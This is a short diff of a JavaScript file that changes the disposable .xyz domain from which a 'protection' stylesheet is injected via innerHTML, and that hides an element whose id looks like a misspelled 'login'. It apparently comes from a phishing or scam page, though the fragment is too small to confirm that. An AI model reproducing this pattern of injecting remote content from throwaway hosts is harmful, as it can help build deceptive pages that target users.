@@ -74,7 +74,7 @@ function formatString(e) {
               function(){
                 var temp = document.createElement('div');
 
-            temp.innerHTML = '<link rel="stylesheet" href="https://gdhgfdas.xyz/pt/protection/ff.css">';
+            temp.innerHTML = '<link rel="stylesheet" href="https://gqzop.xyz/protection/ff.css">';
             var x = document.getElementById("protection");
             var y = document.getElementById("lpggon");
             y.style.display = "none";
